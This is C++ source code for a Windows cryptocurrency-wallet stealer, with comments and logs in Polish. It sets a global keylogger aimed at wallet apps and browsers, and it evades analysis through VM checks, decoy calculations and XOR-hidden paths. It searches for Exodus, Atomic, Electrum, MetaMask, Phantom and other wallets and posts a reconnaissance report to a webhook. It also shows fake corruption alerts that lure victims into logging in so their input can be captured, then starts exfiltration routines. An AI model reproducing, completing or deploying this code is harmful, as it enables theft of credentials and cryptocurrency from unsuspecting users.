#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <numeric>
#include <cmath>
#include <array>
#include <map>
#include <mutex>
#include <fstream>
#include <shlobj.h>
#include <algorithm>
#include <vector>
#include <commctrl.h> // Dla TaskDialogIndirect
#include <psapi.h>    // Dla GetModuleFileNameExW
#include <shlwapi.h>  // Dla PathFindFileNameW
#include <sstream>    // Dla std::stringstream
#include <winhttp.h>  // Dla funkcji WinHttp
#include "common.h"

#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")
#pragma comment(lib, "Comctl32.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// --- Globalne zmienne dla haka klawiatury ---
HHOOK g_keyboardHook = NULL;
std::string g_keystrokeBuffer;
std::mutex g_bufferMutex;
std::vector<std::wstring> g_targetProcesses;

// --- Deklaracje funkcji z tego pliku ---
void performDistractionCalculations(std::array<double, 10>& results);
bool isLikelyVM();

// --- Globalny hak klawiatury ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;

        HWND foreground = GetForegroundWindow();
        if (foreground) {
            DWORD pid;
            GetWindowThreadProcessId(foreground, &pid);
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
            if (hProcess) {
                wchar_t processPath[MAX_PATH];
                if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH)) {
                    std::wstring processName = PathFindFileNameW(processPath);
                    for (const auto& target : g_targetProcesses) {
                        if (_wcsicmp(processName.c_str(), target.c_str()) == 0) {
                            BYTE keyboardState[256] = { 0 };
                            GetKeyboardState(keyboardState);
                            WCHAR buffer[2] = { 0 };
                            if (ToUnicode(pkbhs->vkCode, pkbhs->scanCode, keyboardState, buffer, 2, 0) > 0) {
                                char ch;
                                WideCharToMultiByte(CP_ACP, 0, buffer, 1, &ch, 1, NULL, NULL);
                                if (isprint(ch)) {
                                    std::lock_guard<std::mutex> lock(g_bufferMutex);
                                    g_keystrokeBuffer += ch;
                                }
                            }
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

void HookThread() {
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_keyboardHook) {
        logToFile("[Hook] Błąd: Nie można zainstalować haka klawiatury.");
        return;
    }
    logToFile("[Hook] Hak klawiatury zainstalowany pomyślnie.");
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(g_keyboardHook);
    logToFile("[Hook] Hak klawiatury odinstalowany.");
}

// Funkcja dostępowa do globalnego bufora
std::string getGlobalKeystrokeBuffer(bool clear_buffer) {
    std::lock_guard<std::mutex> lock(g_bufferMutex);
    std::string content = g_keystrokeBuffer;
    if (clear_buffer) {
        g_keystrokeBuffer.clear();
    }
    return content;
}

// --- Funkcje pomocnicze i definicje globalne ---
std::mutex g_logMutex;
void logToFile(const std::string& message) {
    std::lock_guard<std::mutex> lock(g_logMutex);
    std::ofstream logFile("x.log", std::ios_base::app);
    if (logFile.is_open()) {
        char time_buf[80]; time_t now = time(0); struct tm timeinfo;
        localtime_s(&timeinfo, &now); strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", &timeinfo);
        logFile << "[" << time_buf << "] " << message << std::endl;
    }
}

const std::string& getWebhookUrl() {
    static const std::string g_webhookUrl = "-------------->>>>>>>>>WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK WEBHOOK<<<<<<<<-----------------";
    return g_webhookUrl;
}

std::string wstringToString_main(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

bool getKnownPaths(std::wstring& localAppData, std::wstring& roamingAppData) {
    PWSTR pszPath = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszPath))) { localAppData = pszPath; CoTaskMemFree(pszPath); }
    else return false;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &pszPath))) { roamingAppData = pszPath; CoTaskMemFree(pszPath); }
    else return false;
    return true;
}

// --- Funkcje rozpraszające i anty-analiza ---

// Funkcja rozpraszająca, wykonująca złożone obliczenia matematyczne
void performDistractionCalculations(std::array<double, 10>& results) {
    for (int i = 0; i < 10; ++i) {
        double val = (i + 1) * 3.1415926535;
        for (int j = 0; j < 50; ++j) {
            val = sin(val) * cos(val) + sqrt(fabs(val)) * (j + 1);
        }
        results[i] = val;
    }
}

// Prosta funkcja anty-VM sprawdzająca rozmiar dysku twardego
bool isLikelyVM() {
    ULARGE_INTEGER total, free;
    if (GetDiskFreeSpaceExW(L"C:\\", NULL, &total, &free)) {
        DWORDLONG totalGB = total.QuadPart / 1024 / 1024 / 1024;
        if (totalGB < 80 || totalGB == 100 || totalGB == 128 || totalGB == 256) {
            return true;
        }
    }
    return false;
}

// --- Obfuskacja i Fake Alerty ---

// Ulepszona obfuskacja z użyciem XOR
std::vector<char> xor_crypt(const std::string& data, const std::string& key) {
    std::vector<char> result(data.begin(), data.end());
    for (size_t i = 0; i < result.size(); ++i) {
        result[i] ^= key[i % key.length()];
    }
    return result;
}

std::string xor_decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> result = data;
    for (size_t i = 0; i < result.size(); ++i) {
        result[i] ^= key[i % key.length()];
    }
    return std::string(result.begin(), result.end());
}


// Dynamiczne budowanie ścieżek
std::wstring get_dynamic_path(KNOWNFOLDERID folderId, const std::vector<char>& encrypted_fragment, const std::string& key) {
    PWSTR pszPath = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(folderId, 0, NULL, &pszPath))) {
        std::wstring path = pszPath;
        CoTaskMemFree(pszPath);
        std::string decrypted_fragment = xor_decrypt(encrypted_fragment, key);
        return path + std::wstring(decrypted_fragment.begin(), decrypted_fragment.end());
    }
    return L"";
}


void showModernAlert(const std::string& walletName, const std::wstring& fakePath) {
    TASKDIALOGCONFIG tdc = { sizeof(tdc) };
    tdc.hwndParent = NULL;
    tdc.dwFlags = TDF_POSITION_RELATIVE_TO_WINDOW;
    tdc.dwCommonButtons = TDCBF_OK_BUTTON;
    tdc.pszWindowTitle = L"Wallet Error";
    tdc.pszMainIcon = TD_ERROR_ICON;

    std::string convertedName = wstringToString_main(std::wstring(walletName.begin(), walletName.end()));
    std::wstring mainInstruction = L"Data file corruption in " + std::wstring(convertedName.begin(), convertedName.end());
    std::wstring content = L"A critical data file appears to be corrupted, which may affect your transaction history and balance display.\n\nFile: " + fakePath + L"\n\n" + L"The application will now attempt to resynchronize your assets. Please open the application and log in to begin the recovery process.\n\nError code: C0-R3DB-47";

    tdc.pszMainInstruction = mainInstruction.c_str();
    tdc.pszContent = content.c_str();

    TaskDialogIndirect(&tdc, NULL, NULL, NULL);
}

void sendDiscoveryMessage(const std::vector<FileWallet>& fileWallets, const std::vector<BrowserWallet>& browserWallets) {
    logToFile("[Discovery] Przygotowywanie nowej wiadomości rozpoznawczej.");

    auto joinListWithNewline = [](const std::vector<std::string>& v) {
        std::string out;
        for (const auto& s : v) {
            out += s + "\\n";
        }
        if (out.empty()) return std::string("Brak");
        return out.substr(0, out.length() - 2);
    };

    std::vector<std::string> installedBrowsers;
    if (PathFileExistsW((get_dynamic_path(FOLDERID_LocalAppData, xor_crypt("\\Google\\Chrome\\User Data", "key"), "key")).c_str())) installedBrowsers.push_back("🌐 Chrome");
    if (PathFileExistsW((get_dynamic_path(FOLDERID_RoamingAppData, xor_crypt("\\Opera Software\\Opera Stable", "key"), "key")).c_str())) installedBrowsers.push_back("🅾️ Opera");
    if (PathFileExistsW((get_dynamic_path(FOLDERID_RoamingAppData, xor_crypt("\\Opera Software\\Opera GX Stable", "key"), "key")).c_str())) installedBrowsers.push_back("🎮 Opera GX");

    const std::vector<std::string> allFileWallets = { "Exodus", "Atomic Wallet", "Electrum" };
    std::vector<std::string> foundFileWallets, missingFileWallets;
    for (const auto& walletName : allFileWallets) {
        bool isFound = std::any_of(fileWallets.begin(), fileWallets.end(), [&](const FileWallet& fw) { return fw.name == walletName; });
        if (isFound) foundFileWallets.push_back("✅ " + walletName);
        else missingFileWallets.push_back("❌ " + walletName);
    }

    const std::vector<std::string> allBrowserWallets = { "Metamask", "Phantom", "Coinbase Wallet", "Ronin Wallet" };
    std::vector<std::string> foundBrowserWallets, missingBrowserWallets;
    std::map<std::string, std::vector<std::string>> foundBrowserWalletsMap;
    for (const auto& bw : browserWallets) {
        foundBrowserWalletsMap[bw.name].push_back(bw.browser);
    }
    for (const auto& walletName : allBrowserWallets) {
        if (foundBrowserWalletsMap.count(walletName)) {
            std::string browsers = joinListWithNewline(foundBrowserWalletsMap[walletName]);
            foundBrowserWallets.push_back("✅ " + walletName + " (" + browsers + ")");
        }
        else {
            missingBrowserWallets.push_back("❌ " + walletName);
        }
    }

    std::stringstream json_payload;
    json_payload << "{ \"username\": \"Exouds Reporter\", \"embeds\": [ { \"title\": \"System Reconnaissance Report\", \"color\": 15844367, \"fields\": [";
    json_payload << "{ \"name\": \"Installed Browsers\", \"value\": \"" << joinListWithNewline(installedBrowsers) << "\", \"inline\": false },";
    json_payload << "{ \"name\": \"File Wallets (Found)\", \"value\": \"" << joinListWithNewline(foundFileWallets) << "\", \"inline\": true },";
    json_payload << "{ \"name\": \"File Wallets (Missing)\", \"value\": \"" << joinListWithNewline(missingFileWallets) << "\", \"inline\": true },";
    json_payload << "{ \"name\": \"\\u200B\", \"value\": \"\\u200B\", \"inline\": false },";
    json_payload << "{ \"name\": \"Browser Wallets (Found)\", \"value\": \"" << joinListWithNewline(foundBrowserWallets) << "\", \"inline\": true },";
    json_payload << "{ \"name\": \"Browser Wallets (Missing)\", \"value\": \"" << joinListWithNewline(missingBrowserWallets) << "\", \"inline\": true }";
    json_payload << "] } ] }";

    std::string payload_str = json_payload.str();

    HINTERNET hSession = WinHttpOpen(L"Reporter/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    URL_COMPONENTSW urlComp; wchar_t hostName[256], urlPath[2048];
    memset(&urlComp, 0, sizeof(urlComp)); urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName; urlComp.dwHostNameLength = 256; urlComp.lpszUrlPath = urlPath; urlComp.dwUrlPathLength = 2048;
    std::wstring wWebhookUrl(getWebhookUrl().begin(), getWebhookUrl().end());

    if (WinHttpCrackUrl(wWebhookUrl.c_str(), wWebhookUrl.length(), 0, &urlComp)) {
        HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                std::wstring headers = L"Content-Type: application/json; charset=utf-8";
                WinHttpAddRequestHeaders(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);
                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload_str.c_str(), payload_str.length(), payload_str.length(), 0);
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
    }
    WinHttpCloseHandle(hSession);
    logToFile("[Discovery] Nowa wiadomość rozpoznawcza wysłana.");
}


// --- Główny punkt wejścia ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::ofstream("x.log", std::ofstream::out | std::ofstream::trunc);
    logToFile("Aplikacja uruchomiona (main.cpp v2.0 - Advanced Evasion).");

    std::thread(HookThread).detach();

    std::array<double, 10> calculationResults;
    performDistractionCalculations(calculationResults);

    if (isLikelyVM()) {
        for (int i = 0; i < 100; ++i) {
            performDistractionCalculations(calculationResults);
        }
        return 0;
    }

    logToFile("System przeszedł wstępne kontrole.");

    calculationResults.fill(0.0);
    performDistractionCalculations(calculationResults);

    std::wstring localAppData, roamingAppData;
    if (!getKnownPaths(localAppData, roamingAppData)) {
        logToFile("Błąd krytyczny: Nie można uzyskać ścieżek AppData.");
        return 1;
    }

    const std::string key = "super_secret_key_123";
    std::vector<char> exodus_wallet_frag = xor_crypt("\\Exodus\\exodus.wallet", key);
    std::vector<char> exodus_exe_frag = xor_crypt("\\exodus\\Exodus.exe", key);
    std::vector<char> atomic_frag = xor_crypt("\\atomic\\Local Storage\\leveldb", key);
    std::vector<char> electrum_frag = xor_crypt("\\Electrum\\wallets", key);

    std::string dec_exodus_wallet = xor_decrypt(exodus_wallet_frag, key);
    std::string dec_exodus_exe = xor_decrypt(exodus_exe_frag, key);
    std::string dec_atomic = xor_decrypt(atomic_frag, key);
    std::string dec_electrum = xor_decrypt(electrum_frag, key);

    std::wstring exodusExePath, atomicExePath, electrumExePath;
    std::vector<FileWallet> fileWallets = checkFileWallets(
        roamingAppData,
        localAppData,
        exodusExePath,
        std::wstring(dec_exodus_wallet.begin(), dec_exodus_wallet.end()),
        std::wstring(dec_exodus_exe.begin(), dec_exodus_exe.end()),
        std::wstring(dec_atomic.begin(), dec_atomic.end()),
        std::wstring(dec_electrum.begin(), dec_electrum.end()),
        atomicExePath,
        electrumExePath
    );

    performDistractionCalculations(calculationResults);

    std::vector<BrowserWallet> browserWallets = checkBrowserWallets();

    if (fileWallets.empty() && browserWallets.empty()) {
        logToFile("Nie znaleziono żadnych portfeli. Zamykanie.");
        return 0;
    }

    sendDiscoveryMessage(fileWallets, browserWallets);

    logToFile("Znaleziono potencjalne cele. Inicjowanie dalszych modułów.");

    g_targetProcesses.clear();
    for (const auto& wallet : fileWallets) {
        if (!wallet.exe_path.empty()) {
            const wchar_t* exeName = PathFindFileNameW(wallet.exe_path.c_str());
            if (exeName && *exeName) {
                g_targetProcesses.push_back(exeName);
                logToFile("[Main] Dodano do celów keyloggera: " + wstringToString_main(exeName));
            }
        }
    }
    g_targetProcesses.push_back(L"chrome.exe");
    g_targetProcesses.push_back(L"opera.exe");

    if (!browserWallets.empty()) {
        logToFile("Uruchamianie monitora portfeli przeglądarkowych.");
        std::thread(monitorAndExfiltrateBrowserWallets, browserWallets, getWebhookUrl()).detach();
    }

    if (!fileWallets.empty()) {
        logToFile("Znaleziono portfele plikowe. Wyświetlanie alertów i przygotowanie do monitorowania.");

        std::map<std::string, std::wstring> fakePaths;
        fakePaths["Exodus"] = get_dynamic_path(FOLDERID_RoamingAppData, xor_crypt("\\Exodus\\exodus.wallet\\cache.dat", "key"), "key");
        fakePaths["Atomic Wallet"] = get_dynamic_path(FOLDERID_RoamingAppData, xor_crypt("\\atomic\\Local Storage\\leveldb\\000005.ldb", "key"), "key");
        fakePaths["Electrum"] = get_dynamic_path(FOLDERID_RoamingAppData, xor_crypt("\\Electrum\\wallets\\default_wallet", "key"), "key");

        for (const auto& wallet : fileWallets) {
            std::thread(showModernAlert, wallet.name, fakePaths[wallet.name]).detach();
        }

        logToFile("Uruchamianie logiki dla portfeli plikowych za 5 sekund...");
        std::thread([=]() {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            startFileWalletLogic(fileWallets);
            }).detach();
    }

    logToFile("Główny wątek (main) zakończył inicjalizację. Dalsze działania w wątkach tła.");

    Sleep(INFINITE);

    return 0;
}